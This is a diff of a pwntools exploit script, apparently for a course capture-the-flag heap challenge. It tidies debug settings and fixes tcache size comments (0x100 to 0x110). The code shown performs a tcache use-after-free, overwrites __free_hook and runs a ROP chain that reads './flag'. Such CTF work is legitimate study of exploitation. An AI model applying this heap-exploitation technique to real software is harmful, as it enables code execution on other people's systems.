@@ -17,15 +17,8 @@ uu64    = lambda data               :u64(data.ljust(8, '\0'))
 lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
 
 def debug(breakpoint=''):
-    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
-    gdbscript = 'directory %smalloc/\n' % glibc_dir
-    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
-    gdbscript += 'directory %sstdlib/\n' % glibc_dir
-    gdbscript += 'directory %slibio/\n' % glibc_dir
-    gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
@@ -119,11 +112,11 @@ syscall = read_addr + 0xf
 
 
 ## ---------------------- [Step 2] -------------------------- ##
-## Perform UAF by deleting chunk 0 for twice
 free(0)
 free(1)
+
 ## Size of chunk_0 and chunk_1 is 0x100, among size of tcachebin
-## tcache_bin(0x100) --> chunk_1 --> chunk_0
+## tcache_bin(0x110) --> chunk_1 --> chunk_0
 chunk_0_addr = u64(write(1) + "\x00\x00")
 chunk_1_addr = chunk_0_addr + 0x110
 log.success(hex(chunk_0_addr))
@@ -133,14 +126,14 @@ log.success(hex(chunk_0_addr))
 read(0, p64(free_hook_addr))
 
 
-## tcache_bin(0x100) --> chunk_1 --> chunk_0 --> free_hook
+## tcache_bin(0x110) --> chunk_1 --> chunk_0 --> free_hook
 ## chunk_4 would be overlapped with chunk_1
 ## chunk_5 would be overlapped with chunk_0
 alloc(4, 0x100)
 alloc(5, 0x100)
 
 
-## tcache_bin(0x100) --> free_hook
+## tcache_bin(0x110) --> free_hook
 ## chunk_6 would be overlapped with free_hook
 alloc(6, 0x100)
 
@@ -177,10 +170,10 @@ payload += "./flag"
 ## chunk_1 is used to store rop chain
 read(1, payload)
 
+## chunk_5 is used to trigger the rop
 payload2 = "".ljust(0xa0, "a") + p64(chunk_1_addr) + p64(ret_gadget)
 read(5, payload2)
 
-# print(hex(setcontext_addr))
-# debug()
+## begin rop
 free(5)
 p.interactive()
